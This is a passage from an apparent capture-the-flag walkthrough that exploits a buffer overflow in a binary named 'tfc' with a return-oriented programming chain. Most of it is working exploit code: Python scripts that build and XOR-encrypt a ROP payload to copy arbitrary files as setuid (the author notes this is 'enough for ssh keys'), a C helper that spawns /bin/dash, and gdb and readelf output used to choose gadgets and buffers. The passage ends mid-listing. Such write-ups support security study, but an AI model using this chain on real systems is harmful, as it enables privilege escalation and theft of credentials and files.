  400583:   bf <span class="m">34</span> <span class="m">06</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400634</span>,%edi
  400588:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
  40058d:   e8 ce fe ff ff          callq  <span class="m">400460</span> &lt;open@plt&gt;</code></pre></div>


<p>Finally, cleaning up the stack is necessary. After the first call to open, the stack would look like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span>

<span class="k">return</span> <span class="n">to</span> <span class="nl">next_func</span><span class="p">:</span>

<span class="n">esp</span><span class="o">-</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span></code></pre></div>


<p>But next_func requires completely different arguments! We need to align the stack pointer after returning from &lsquo;write&rsquo;. This can be removing a few values from the stack before return to next_func.</p>

<p>This removal of values can be using a primitive called <code>pop pop pop ret</code>. The return address for the libc calls is a place in the binary that contains three pop instructions, which pop three values from the stack, and then return to whatever value is on the stack. This allows code execution to continue smoothly, otherwise it might choke on one of the values that we pass to a libc function. I used my ropgadget script to find it at <code>0x80489d6</code>; there are many more, and many other ways to find them. The basic ROP chain element now looks like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">--&gt;:</span> <span class="n">ADDR</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>

<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">PPPR</span>        <span class="err">#</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">ret</span> <span class="n">primitive</span><span class="p">,</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">values</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="p">.</span> 
                    <span class="err">#</span> <span class="n">this</span> <span class="n">pppr</span> <span class="n">primitive</span> <span class="n">must</span> <span class="n">have</span> <span class="n">enough</span> <span class="n">POPs</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">N</span> <span class="n">arguments</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="o">!</span>

<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="n">ARG_1</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">one</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="n">ARG_2</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">two</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="n">ARG_n</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">n</span>   <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>

<span class="n">esp</span><span class="o">+</span><span class="mi">14</span><span class="o">:</span> <span class="n">NEXT</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">next</span> <span class="n">function</span> <span class="n">at</span> <span class="n">NEXT</span></code></pre></div>


<p>So we have all the values we need, let&rsquo;s put it together in a semi-smart and flexible way. I made a python script to handle building and encrypting the payload:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
    
    <span class="k">return</span> <span class="n">output</span>
    
<span class="k">def</span> <span class="nf">genPayload</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>

    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

    <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>

    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">())</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -l ./tfc</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc
</span><span class='line'>
</span><span class='line'>Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</span><span class='line'>Entry point 0x8048500
</span><span class='line'>There are <span class="m">8</span> program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
</span><span class='line'>  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
</span><span class='line'>      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
</span><span class='line'>  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
</span><span class='line'>  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
</span><span class='line'>  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
</span><span class='line'>  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
</span></code></pre></td></tr></table></div></figure>


<p>Looks like there is some space in the DYNAMIC or LOAD sections. I fired up the binary in <code>gdb</code> to verify:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Breakpoint 1, 0x08048927 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/400x 0x08049c54
</span><span class='line'>0x8049c54 &lt;_DYNAMIC&gt;:   0x00000001  0x00000010  0x0000000c  0x08048404
</span><span class='line'>0x8049c64 &lt;_DYNAMIC+16&gt;:    0x0000000d  0x08048a54  0x00000019  0x08049c48
</span><span class='line'>0x8049c74 &lt;_DYNAMIC+32&gt;:    0x0000001b  0x00000004  0x0000001a  0x08049c4c
</span><span class='line'>0x8049c84 &lt;_DYNAMIC+48&gt;:    0x0000001c  0x00000004  0x00000004  0x0804818c
</span><span class='line'>0x8049c94 &lt;_DYNAMIC+64&gt;:    0x6ffffef5  0x080481d8  0x00000005  0x080482d8
</span><span class='line'>0x8049ca4 &lt;_DYNAMIC+80&gt;:    0x00000006  0x080481f8  0x0000000a  0x00000087
</span><span class='line'>0x8049cb4 &lt;_DYNAMIC+96&gt;:    0x0000000b  0x00000010  0x00000015  0xf7715924
</span><span class='line'>0x8049cc4 &lt;_DYNAMIC+112&gt;:   0x00000003  0x08049d48  0x00000002  0x00000060
</span><span class='line'>0x8049cd4 &lt;_DYNAMIC+128&gt;:   0x00000014  0x00000011  0x00000017  0x080483a4
</span><span class='line'>0x8049ce4 &lt;_DYNAMIC+144&gt;:   0x00000011  0x0804839c  0x00000012  0x00000008
</span><span class='line'>0x8049cf4 &lt;_DYNAMIC+160&gt;:   0x00000013  0x00000008  0x6ffffffe  0x0804837c
</span><span class='line'>0x8049d04 &lt;_DYNAMIC+176&gt;:   0x6fffffff  0x00000001  0x6ffffff0  0x08048360
</span><span class='line'>0x8049d14 &lt;_DYNAMIC+192&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d24 &lt;_DYNAMIC+208&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d34 &lt;_DYNAMIC+224&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d44:    0x00000000  0x08049c54  0xf7715938  0xf77084a0
</span><span class='line'>0x8049d54 &lt;strcmp@got.plt&gt;: 0x08048446  0x08048456  0x08048466  0x08048476
</span><span class='line'>0x8049d64 &lt;puts@got.plt&gt;:   0x08048486  0x08048496  0x080484a6  0xf7545970
</span><span class='line'>0x8049d74 &lt;write@got.plt&gt;:  0x080484c6  0x080484d6  0x080484e6  0x080484f6
</span><span class='line'>0x8049d84:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d94:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049da4 &lt;__dso_handle&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049db4 &lt;__dso_handle+16&gt;:    0x00000000  0x00000000  0x00000000  0x5f5f5f5f
</span><span class='line'>0x8049dc4 &lt;banr+4&gt;: 0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f
</span><span class='line'>0x8049dd4 &lt;banr+20&gt;:    0x5f5f5f5f  0x5f5f5f5f  0x205f5f5f  0x5c0a0d20
</span><span class='line'>0x8049de4 &lt;banr+36&gt;:    0x20205f5f  0x5f5f2020  0x5f5c2f5f  0x5f202020
</span><span class='line'>0x8049df4 &lt;banr+52&gt;:    0x5f5f5f5f  0x205f5c2f  0x5f5f2020  0x205c205f
</span><span class='line'>...
</span><span class='line'>0x8049fe4:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049ff4:    0x00000000  0x00000000  0x00000000  Cannot access memory at address 0x804a000
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t really use places like <code>0x8049d54 &lt;strcmp@got.plt&gt;</code>, because there are function pointers there, ones that we need! I picked this location at <code>0x8049db8</code>. It didn&rsquo;t look like it contained crucial information. Furthermore, it was writeable and had a decent number of bytes behind it.</p>

<p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
    
    <span class="k">return</span> <span class="n">output</span>
    
<span class="k">def</span> <span class="nf">genPayload</span><span class="p">(</span><span class="n">filesize</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">&quot;[!] filesize = {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>

    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

    <span class="c"># open(&#39;read&#39;) for reading. fd = 0x06</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049315</span><span class="p">)</span> <span class="c"># &quot;read\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># readonly</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># ?</span>

    <span class="n">iterations</span> <span class="o">=</span> <span class="p">(</span><span class="n">filesize</span> <span class="o">/</span> <span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="k">print</span> <span class="s">&quot;[!] need {} iterations&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iterations</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">iterations</span><span class="p">):</span>
        <span class="c"># read 0x200 bytes from &#39;read&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048450</span><span class="p">)</span> <span class="c"># read@plt()</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>        <span class="c"># fd</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># filesize  --&gt; not a lot to work with, but enough for ssh keys</span>

        <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>

    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&quot;Usage: {} &lt;file&gt;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span> <span class="s">&quot;Please provide proper files/symlinks in &#39;read&#39; and &#39;write&#39;&quot;</span>
        <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">i</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>This python code will add blocks of read &amp; write ROP chain elements, just as many are needed for a certain file. This is also why we&rsquo;ve opened the output file as O_APPEND: each write will simply add to the existing file, no hassle!</p>

<p>Unfortunately, if you want to read and write <em>really</em> large files, like <code>/bin/dash</code>, tfc crashes before it can even get to our ROP chain. I solve that with a little helper program:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>


<p>OK, so now our moment supreme:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 24
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c    
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>         <span class="c"># our little helper program</span>
